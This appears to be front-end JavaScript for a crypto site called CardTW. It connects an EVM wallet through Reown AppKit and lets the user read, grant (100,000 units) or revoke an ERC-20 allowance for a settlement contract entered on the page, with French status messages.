import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import {
  mainnet,
  arbitrum,
  base,
  polygon,
  optimism,
  bsc,
  avalanche
} from '@reown/appkit/networks'

const projectId = '17c85e8f03aeb086abdd0f20c6070032'
const networks = [mainnet, arbitrum, base, polygon, optimism, bsc, avalanche]

const metadata = {
  name: 'CardTW',
  description: 'CardTW — wallet connection',
  url: 'https://ihv08263-pixel.github.io',
  icons: ['https://ihv08263-pixel.github.io/cardtw/assets/cardtw-logo.png']
}

let appKit = null
let initError = null

try {
  const wagmiAdapter = new WagmiAdapter({ projectId, networks })

  appKit = createAppKit({
    adapters: [wagmiAdapter],
    networks,
    projectId,
    metadata,
    features: {
      analytics: false
    },
    themeMode: 'light',
    themeVariables: {
      '--w3m-accent': '#2a2bff',
      '--w3m-border-radius-master': '12px'
    }
  })

  window.cardtwAppKit = appKit
} catch (error) {
  initError = error
  console.error('[CardTW] Reown initialization failed:', error)
}

function showStatus(message) {
  const status = document.getElementById('cardtwWalletStatus')
  const address = document.getElementById('cardtwWalletAddress')
  if (status) status.textContent = message
  if (address && !window.cardtwAppKit?.getIsConnected?.()) {
    address.textContent = 'Vérifiez votre wallet ou rechargez la page.'
  }
}

function shortAddress(value) {
  return value ? `${value.slice(0, 6)}…${value.slice(-4)}` : ''
}

function render() {
  if (!appKit) {
    showStatus('Connexion wallet indisponible')
    return
  }

  const connected = appKit.getIsConnected()
  const address = appKit.getAddress()
  const chainId = appKit.getChainId()

  const status = document.getElementById('cardtwWalletStatus')
  const addressEl = document.getElementById('cardtwWalletAddress')

  if (!status || !addressEl) return

  if (connected && address) {
    status.textContent = `Wallet connecté · ${shortAddress(address)}`
    addressEl.textContent = `Adresse : ${address}${chainId ? ` · Chain ID ${chainId}` : ''}`
  } else {
    status.textContent = 'Wallet non connecté'
    addressEl.textContent = 'Connectez votre wallet pour continuer.'
  }
}

async function openConnect() {
  if (appKit) {
    try {
      appKit.open({ view: 'Connect', namespace: 'eip155' })
      return
    } catch (error) {
      console.error('[CardTW] AppKit open failed:', error)
    }
  }

  // Fallback for browsers with an injected EVM wallet.
  if (window.ethereum?.request) {
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      })
      if (accounts?.[0]) {
        showStatus(`Wallet connecté · ${shortAddress(accounts[0])}`)
        const address = document.getElementById('cardtwWalletAddress')
        if (address) address.textContent = accounts[0]
        return
      }
    } catch (error) {
      if (error?.code !== 4001) console.error('[CardTW] Injected wallet failed:', error)
      return
    }
  }

  showStatus('Aucun wallet compatible détecté')
  console.error('[CardTW] Reown init/open unavailable', initError)
}

document.querySelectorAll('[data-wallet-connect]').forEach((button) => {
  button.addEventListener('click', (event) => {
    event.preventDefault()
    openConnect()
  })
})

if (appKit) {
  appKit.subscribeState(() => render())
  appKit.subscribeProvider(() => render())
}

if (window.ethereum?.on) {
  window.ethereum.on('accountsChanged', () => render())
  window.ethereum.on('chainChanged', () => render())
}

render()


const NETWORKS = {
  ethereum: '0x1',
  bsc: '0x38',
  polygon: '0x89',
  arbitrum: '0xa4b1',
  optimism: '0xa',
  base: '0x2105',
  avalanche: '0xa86a',
  linea: '0xe708',
  zksync: '0x144'
}
const APPROVE = '0x095ea7b3'
const ALLOWANCE = '0xdd62ed3e'
const LIMIT_UNITS = 100000n

const padAddress = (a) => a.slice(2).toLowerCase().padStart(64, '0')
const padUint = (v) => v.toString(16).padStart(64, '0')
const validAddress = (a) => /^0x[a-fA-F0-9]{40}$/.test(a.trim())
const provider = () => window.ethereum || null

function note(message) {
  const el = document.getElementById('settlementNote')
  if (el) el.textContent = message
}

async function requireSelectedNetwork() {
  const p = provider()
  if (!p) throw new Error('Aucun wallet EVM injecté. Utilisez Reown/WalletConnect ou un wallet navigateur compatible.')
  const requested = NETWORKS[document.getElementById('settlementNetwork')?.value || 'ethereum']
  const current = await p.request({ method:'eth_chainId' })
  if (current !== requested) {
    try {
      await p.request({ method:'wallet_switchEthereumChain', params:[{chainId: requested}] })
    } catch (e) {
      if (e?.code === 4902) throw new Error('Ce réseau n’est pas ajouté dans le wallet.')
      throw e
    }
  }
  const accounts = await p.request({ method:'eth_requestAccounts' })
  if (!accounts?.[0]) throw new Error('Aucun compte sélectionné.')
  return { p, account: accounts[0], chainId: requested }
}

async function tokenDecimals(p, token) {
  const raw = await p.request({
    method:'eth_call',
    params:[{to: token, data:'0x313ce567'}, 'latest']
  })
  const d = Number(BigInt(raw))
  if (!Number.isInteger(d) || d < 0 || d > 36) throw new Error('Décimales du token invalides.')
  return d
}

async function readCurrentAllowance(p, token, owner, spender, decimals) {
  const data = ALLOWANCE + padAddress(owner) + padAddress(spender)
  const raw = await p.request({
    method:'eth_call',
    params:[{to: token, data}, 'latest']
  })
  const value = BigInt(raw)
  const scale = 10n ** BigInt(decimals)
  return { raw:value, human:Number(value) / Number(scale) }
}

async function refreshAllowanceUI() {
  try {
    const {p, account} = await requireSelectedNetwork()
    const token = document.getElementById('settlementToken').value.trim()
    const spender = document.getElementById('settlementSpender').value.trim()
    if (!validAddress(token) || !validAddress(spender)) {
      note('Renseignez un token ERC-20 et un contrat de settlement valides.')
      return
    }
    const decimals = await tokenDecimals(p, token)
    const current = await readCurrentAllowance(p, token, account, spender, decimals)
    document.getElementById('allowedAmount').textContent = current.human.toLocaleString()
    document.getElementById('remainingAmount').textContent = Math.max(0, 100000 - current.human).toLocaleString()
    note('Allowance lue sur le réseau sélectionné.')
  } catch (e) {
    note(e?.message || String(e))
  }
}

async function authorize100k() {
  try {
    const {p, account} = await requireSelectedNetwork()
    const token = document.getElementById('settlementToken').value.trim()
    const spender = document.getElementById('settlementSpender').value.trim()
    if (!validAddress(token) || !validAddress(spender)) {
      note('Renseignez un token ERC-20 et un contrat de settlement valides.')
      return
    }
    const decimals = await tokenDecimals(p, token)
    const amount = LIMIT_UNITS * (10n ** BigInt(decimals))
    const data = APPROVE + padAddress(spender) + padUint(amount)

    note('Confirmation de l’autorisation dans le wallet…')
    const tx = await p.request({
      method:'eth_sendTransaction',
      params:[{from:account, to:token, data}]
    })
    note(`Autorisation envoyée · ${tx}`)
    setTimeout(refreshAllowanceUI, 1500)
  } catch (e) {
    if (e?.code === 4001) note('Autorisation refusée dans le wallet.')
    else note(e?.message || String(e))
  }
}

async function revoke100k() {
  try {
    const {p, account} = await requireSelectedNetwork()
    const token = document.getElementById('settlementToken').value.trim()
    const spender = document.getElementById('settlementSpender').value.trim()
    if (!validAddress(token) || !validAddress(spender)) {
      note('Renseignez un token ERC-20 et un contrat de settlement valides.')
      return
    }
    const data = APPROVE + padAddress(spender) + padUint(0n)
    note('Confirmation de la révocation dans le wallet…')
    const tx = await p.request({
      method:'eth_sendTransaction',
      params:[{from:account, to:token, data}]
    })
    note(`Révocation envoyée · ${tx}`)
    setTimeout(refreshAllowanceUI, 1500)
  } catch (e) {
    if (e?.code === 4001) note('Révocation refusée dans le wallet.')
    else note(e?.message || String(e))
  }
}

document.getElementById('authorize100k')?.addEventListener('click', authorize100k)
document.getElementById('refreshAllowance')?.addEventListener('click', refreshAllowanceUI)
document.getElementById('revokeAllowance')?.addEventListener('click', revoke100k)
document.getElementById('settlementNetwork')?.addEventListener('change', refreshAllowanceUI)
